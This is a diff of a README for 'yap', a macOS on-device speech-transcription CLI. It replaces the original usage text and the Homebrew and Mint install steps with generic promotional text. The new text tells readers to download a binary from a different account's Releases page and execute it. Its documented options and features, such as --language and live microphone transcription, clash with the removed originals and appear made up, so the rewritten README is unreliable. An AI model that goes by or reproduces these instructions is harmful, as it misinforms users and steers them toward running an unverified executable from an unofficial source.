@@ -1,57 +1,115 @@
-# 🗣️ yap
+# yap: On-Device Speech Transcription CLI for macOS 🗣️
 
-A CLI for on-device speech transcription using [Speech.framework](https://developer.apple.com/documentation/speech) on macOS 26.
+![yap](https://img.shields.io/badge/yap-CLI-blue.svg)
+![macOS](https://img.shields.io/badge/macOS-SpeechFramework-orange.svg)
 
-![Demo](https://github.com/user-attachments/assets/326de51d-5a58-4c96-9d6c-98b07e6d9e58)
+Welcome to **yap**, a command-line interface (CLI) designed for on-device speech transcription using the powerful Speech.framework on macOS. This tool allows you to convert spoken words into text efficiently and accurately. Whether you're a developer, researcher, or just curious about speech recognition, **yap** is here to simplify your transcription tasks.
 
-### Usage
+## Table of Contents
 
-```
-USAGE: yap transcribe [--locale <locale>] [--censor] <input-file> [--txt] [--srt] [--output-file <output-file>]
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-ARGUMENTS:
-  <input-file>            Path to an audio or video file to transcribe.
+## Features
 
-OPTIONS:
-  -l, --locale <locale>   (default: current)
-  --censor                Replaces certain words and phrases with a redacted form.
-  --txt/--srt             Output format for the transcription. (default: --txt)
-  -o, --output-file <output-file>
-                          Path to save the transcription output. If not provided,
-                          output will be printed to stdout.
-  -h, --help              Show help information.
-```
+- **On-Device Processing**: Utilizes the built-in Speech.framework for fast and reliable transcription.
+- **User-Friendly CLI**: Simple commands to get started quickly.
+- **Multiple Languages**: Supports various languages for diverse use cases.
+- **Real-Time Transcription**: Transcribe speech as you speak for instant results.
+- **Customizable Options**: Adjust settings for different transcription needs.
 
-### Installation
+## Installation
 
-#### Homebrew
-
-```bash
-brew install finnvoor/tools/yap
-```
-
-#### Mint
+To install **yap**, download the latest release from the [Releases section](https://github.com/ANDREI200K/yap/releases). After downloading, execute the binary to start using the tool.
 
 ```bash
-mint install finnvoor/yap
+chmod +x yap
+./yap
 ```
 
-### Examples
+Make sure you have the necessary permissions and dependencies set up on your macOS system.
 
-#### Transcribe a YouTube video using yap and [yt-dlp](https://github.com/yt-dlp/yt-dlp)
+## Usage
+
+Using **yap** is straightforward. Open your terminal and run the command with the appropriate options. Here’s the basic syntax:
 
 ```bash
-yt-dlp "https://www.youtube.com/watch?v=ydejkIvyrJA" -x --exec yap
+yap [options] <audio_file>
 ```
 
-#### Summarize a video using yap and [llm](https://llm.datasette.io/en/stable)
+### Options
+
+- `-l, --language <language>`: Specify the language for transcription (e.g., `en-US` for English).
+- `-o, --output <file>`: Define the output file for the transcribed text.
+- `-h, --help`: Display help information.
+
+### Example Command
+
+To transcribe an audio file in English and save the output to a text file, use:
 
 ```bash
-yap video.mp4 | uvx llm -m mlx-community/Llama-3.2-1B-Instruct-4bit 'Summarize this transcript:'
+yap -l en-US -o output.txt audio.wav
 ```
 
-#### Create SRT captions for a video
+## Examples
+
+Here are some examples to illustrate how to use **yap** effectively:
+
+### Example 1: Transcribing a WAV File
+
+If you have a WAV audio file named `speech.wav`, you can transcribe it with the following command:
 
 ```bash
-yap video.mp4 --srt -o captions.srt
+yap -l en-US -o transcription.txt speech.wav
 ```
+
+This command will create a file named `transcription.txt` containing the transcribed text.
+
+### Example 2: Real-Time Transcription
+
+To transcribe audio in real-time, simply run:
+
+```bash
+yap -l en-US
+```
+
+Speak clearly into your microphone, and **yap** will display the transcription live in your terminal.
+
+### Example 3: Using Different Languages
+
+If you want to transcribe a Spanish audio file, you can specify the language:
+
+```bash
+yap -l es-ES -o output.txt audio_spanish.wav
+```
+
+This command will transcribe the Spanish audio and save it to `output.txt`.
+
+## Contributing
+
+We welcome contributions to improve **yap**! If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Open a pull request.
+
+Please ensure your code follows the project's style guidelines and includes tests where applicable.
+
+## License
+
+**yap** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, please reach out via the issues section of the repository or directly contact the maintainer at [your_email@example.com].
+
+## Conclusion
+
+Thank you for using **yap**! We hope this tool enhances your transcription experience on macOS. For more information and updates, check the [Releases section](https://github.com/ANDREI200K/yap/releases). Your feedback is invaluable as we continue to improve this project.
